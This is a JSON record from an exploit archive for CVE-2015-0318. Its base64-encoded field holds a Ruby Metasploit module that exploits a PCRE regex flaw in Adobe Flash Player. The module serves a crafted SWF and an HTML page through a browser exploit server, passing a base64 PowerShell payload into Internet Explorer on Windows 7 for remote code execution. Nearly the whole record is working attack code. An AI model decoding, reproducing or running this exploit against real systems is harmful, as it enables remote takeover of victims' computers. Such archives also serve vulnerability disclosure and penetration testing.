{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIENMQVNTSUQgPSAgJ2QyN2NkYjZlLWFlNmQtMTFjZi05NmI4LTQ0NDU1MzU0MDAwMCcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UG93ZXJzaGVsbA0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpCcm93c2VyRXhwbG9pdFNlcnZlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gIkFkb2JlIEZsYXNoIFBsYXllciBQQ1JFIFJlZ2V4IFZ1bG5lcmFiaWxpdHkiLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGZvdW5kIGluIEFkb2JlIEZsYXNoIFBsYXllci4gQSBjb21waWxhdGlvbiBsb2dpYyBlcnJvcg0KICAgICAgICBpbiB0aGUgUENSRSBlbmdpbmUsIHNwZWNpZmljYWxseSBpbiB0aGUgaGFuZGxpbmcgb2YgdGhlIFxjIGVzY2FwZSBzZXF1ZW5jZSB3aGVuIGZvbGxvd2VkIGJ5DQogICAgICAgIGEgbXVsdGktYnl0ZSBVVEY4IGNoYXJhY3RlciwgYWxsb3dzIGFyYml0cmFyeSBleGVjdXRpb24gb2YgUENSRSBieXRlY29kZS4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgJ01hcmsgQnJhbmQnLCAjIEZvdW5kIHZ1bG4NCiAgICAgICAgICAnc2lubjNyJyAgICAgICMgTVNGDQogICAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdDVkUnLCAnMjAxNS0wMzE4JyBdLA0KICAgICAgICAgIFsgJ1VSTCcsICdodHRwOi8vZ29vZ2xlcHJvamVjdHplcm8uYmxvZ3Nwb3QuY29tLzIwMTUvMDIvZXhwbG9pdGluZ3NjdmUtMjAxNS0wMzE4c2luc2ZsYXNoLmh0bWwnIF0sDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vY29kZS5nb29nbGUuY29tL3AvZ29vZ2xlLXNlY3VyaXR5LXJlc2VhcmNoL2lzc3Vlcy9kZXRhaWw/aWQ9MTk5JyBdDQogICAgICAgIF0sDQogICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnU3BhY2UnID0+IDEwMjQsDQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1JldHJpZXMnID0+IHRydWUNCiAgICAgICAgfSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJ3dpbicsDQogICAgICAnQnJvd3NlclJlcXVpcmVtZW50cycgPT4NCiAgICAgICAgew0KICAgICAgICAgIDpzb3VyY2UgID0+IC9zY3JpcHR8aGVhZGVycy9pLA0KICAgICAgICAgIDpjbHNpZCAgID0+ICJ7I3tDTEFTU0lEfX0iLA0KICAgICAgICAgIDptZXRob2QgID0+ICJMb2FkTW92aWUiLA0KICAgICAgICAgIDpvc19uYW1lID0+IE9wZXJhdGluZ1N5c3RlbXM6Ok1hdGNoOjpXSU5ET1dTXzcsDQogICAgICAgICAgOnVhX25hbWUgPT4gTXNmOjpIdHRwQ2xpZW50czo6SUUsDQogICAgICAgICAgIyBPaHRlciB2ZXJzaW9ucyBhcmUgdnVsbmVyYWJsZSBidXQgLjIzNSBpcyB0aGUgb25lIHRoYXQgd29ya3MgZm9yIG1lIHByZXR0eSB3ZWxsDQogICAgICAgICAgIyBTbyB3ZSdyZSBnb25uYSBsaW1pdCB0byB0aGlzIG9uZSBmb3Igbm93LiBNb3JlIHZhbGlkYXRpb24gbmVlZGVkIGluIHRoZSBmdXR1cmUuDQogICAgICAgICAgOmZsYXNoICAgPT4gbGFtYmRhIHsgfHZlcnwgdmVyID09ICcxNi4wLjAuMjM1JyB9DQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdBdXRvbWF0aWMnLCB7fSBdDQogICAgICAgIF0sDQogICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiTm92IDI1IDIwMTQiLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwKSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICAjIFBsZWFzZSBzZWUgZGF0YS9leHBsb2l0cy9DVkUtMjAxNS0wMzE4LyBmb3Igc291cmNlLA0KICAgICMgdGhhdCdzIHdoZXJlIHRoZSBhY3R1YWwgZXhwbG9pdCBpcw0KICAgIEBzd2YgPSBjcmVhdGVfc3dmDQogICAgc3VwZXINCiAgZW5kDQoNCiAgZGVmIG9uX3JlcXVlc3RfZXhwbG9pdChjbGksIHJlcXVlc3QsIHRhcmdldF9pbmZvKQ0KICAgIHByaW50X3N0YXR1cygiUmVxdWVzdDogI3tyZXF1ZXN0LnVyaX0iKQ0KDQogICAgaWYgcmVxdWVzdC51cmkgPX4gL1wuc3dmJC8NCiAgICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBTV0YuLi4iKQ0KICAgICAgc2VuZF9yZXNwb25zZShjbGksIEBzd2YsIHsnQ29udGVudC1UeXBlJz0+J2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywgJ1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiU2VuZGluZyBIVE1MLi4uIikNCiAgICB0YWcgPSByZXRyaWV2ZV90YWcoY2xpLCByZXF1ZXN0KQ0KICAgIHByb2ZpbGUgPSBnZXRfcHJvZmlsZSh0YWcpDQogICAgcHJvZmlsZVs6dHJpZWRdID0gZmFsc2UgdW5sZXNzIHByb2ZpbGUubmlsPyAjIHRvIGFsbG93IHJlcXVlc3QgdGhlIHN3Zg0KICAgIHNlbmRfZXhwbG9pdF9odG1sKGNsaSwgZXhwbG9pdF90ZW1wbGF0ZShjbGksIHRhcmdldF9pbmZvKSwgeydQcmFnbWEnID0+ICduby1jYWNoZSd9KQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdF90ZW1wbGF0ZShjbGksIHRhcmdldF9pbmZvKQ0KICAgIHN3Zl9yYW5kb20gPSAiI3tyYW5kX3RleHRfYWxwaGEoNCArIHJhbmQoMykpfS5zd2YiDQogICAgdGFyZ2V0X3BheWxvYWQgPSBnZXRfcGF5bG9hZChjbGksIHRhcmdldF9pbmZvKQ0KICAgIHBzaF9wYXlsb2FkID0gY21kX3BzaF9wYXlsb2FkKHRhcmdldF9wYXlsb2FkLCAneDg2Jywge3JlbW92ZV9jb21zcGVjOiB0cnVlfSkNCiAgICBiNjRfcGF5bG9hZCA9IFJleDo6VGV4dC5lbmNvZGVfYmFzZTY0KHBzaF9wYXlsb2FkKQ0KDQogICAgaHRtbF90ZW1wbGF0ZSA9ICVRfDxodG1sPg0KICAgIDxib2R5Pg0KICAgIDxvYmplY3QgY2xhc3NpZD0iY2xzaWQ6I3tDTEFTU0lEfSIgY29kZWJhc2U9Imh0dHA6Ly9kb3dubG9hZC5tYWNyb21lZGlhLmNvbS9wdWIvc2hvY2t3YXZlL2NhYnMvZmxhc2gvc3dmbGFzaC5jYWIiIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIC8+DQogICAgPHBhcmFtIG5hbWU9Im1vdmllIiB2YWx1ZT0iPCU9c3dmX3JhbmRvbSU+IiAvPg0KICAgIDxwYXJhbSBuYW1lPSJhbGxvd1NjcmlwdEFjY2VzcyIgdmFsdWU9ImFsd2F5cyIgLz4NCiAgICA8cGFyYW0gbmFtZT0iRmxhc2hWYXJzIiB2YWx1ZT0ic2g9PCU9YjY0X3BheWxvYWQlPiIgLz4NCiAgICA8cGFyYW0gbmFtZT0iUGxheSIgdmFsdWU9InRydWUiIC8+DQogICAgPGVtYmVkIHR5cGU9ImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIiB3aWR0aD0iMSIgaGVpZ2h0PSIxIiBzcmM9IjwlPXN3Zl9yYW5kb20lPiIgYWxsb3dTY3JpcHRBY2Nlc3M9ImFsd2F5cyIgRmxhc2hWYXJzPSJzaD08JT1iNjRfcGF5bG9hZCU+IiBQbGF5PSJ0cnVlIi8+DQogICAgPC9vYmplY3Q+DQogICAgPC9ib2R5Pg0KICAgIDwvaHRtbD4NCiAgICB8DQoNCiAgICByZXR1cm4gaHRtbF90ZW1wbGF0ZSwgYmluZGluZygpDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfc3dmDQogICAgcGF0aCA9IDo6RmlsZS5qb2luKCBNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgIkNWRS0yMDE1LTAzMTgiLCAiTWFpbi5zd2YiICkNCiAgICBzd2YgPSA6OkZpbGUub3BlbihwYXRoLCAncmInKSB7IHxmfCBzd2YgPSBmLnJlYWQgfQ0KDQogICAgc3dmDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/windows/remote/36420.rb", 
    "id": "36420", 
    "cves": [
        "CVE-2015-0318"
    ]
}